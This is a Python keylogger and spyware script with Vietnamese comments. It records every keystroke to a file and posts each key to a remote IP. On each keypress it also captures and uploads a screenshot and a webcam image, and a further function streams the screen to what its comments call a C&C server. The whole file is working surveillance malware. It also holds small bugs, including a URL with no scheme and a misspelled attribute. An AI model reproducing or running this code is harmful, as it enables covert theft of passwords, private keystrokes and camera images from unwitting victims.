from pynput import keyboard
import requests
from PIL import ImageGrab
import io
import cv2
import numpy as np
import cv2
import time

def send_data(data):
    try:
        response = requests.post("117.2.255.206:5000/data", data=data)
        print(f'Data sent: {data}, Response: {response.status_code}')
    except Exception as e:
        print(f'Error sending data: {e}')

def send_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        files = {'screenshot': img_byte_arr}
        response = requests.post("http://10.10.27.17:5000/screenshot", files=files)
        print(f'Screenshot sent, Response: {response.status_code}')
    except Exception as e:
        print(f'Error sending screenshot: {e}')

def send_camera_image():
    try:
        # Mở camera
        cap = cv2.VideoCapture(0)
        
        # Đọc một khung hình
        ret, frame = cap.read()
        if ret:
            # Chuyển đổi khung hình thành byte
            img_byte_arr = io.BytesIO()
            _, buffer = cv2.imencode('.png', frame)
            img_byte_arr.write(buffer)
            img_byte_arr.seek(0)
            
            # Gửi ảnh đến máy chủ C&C
            files = {'camera_image': img_byte_arr}
            response = requests.post("http://10.10.27.17:5000/camera_image", files=files)
            print(f'Camera image sent, Response: {response.status_code}')
        
        # Giải phóng camera
        cap.release()
    except Exception as e:
        print(f'Error sending camera image: {e}')
def send_video():
    try:
        screen_width = 1920  # Thay đổi theo kích thước màn hình của bạn
        screen_height = 1080  # Thay đổi theo kích thước màn hình của bạn
        
        print("Starting video stream...")  # Thông báo bắt đầu

        while True:
            img = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
            img_np = np.array(img)
            _, buffer = cv2.imencode('.jpg', img_np)
            img_byte_arr = io.BytesIO(buffer)

            files = {'video_frame': img_byte_arr}
            response = requests.post("http://10.10.27.17:5000/video_frame", files=files)

            print(f'Frame sent, Response: {response.stdatus_code}')  # Thông báo gửi khung hình
            time.sleep(0.1)  # Gửi khung hình mỗi 100ms

    except Exception as e:
        print(f'Error sending video: {e}')
        

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")
        send_data(str(key))

    send_screenshot() 
    send_camera_image()  # Gọi hàm gửi ảnh từ camera
   

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


        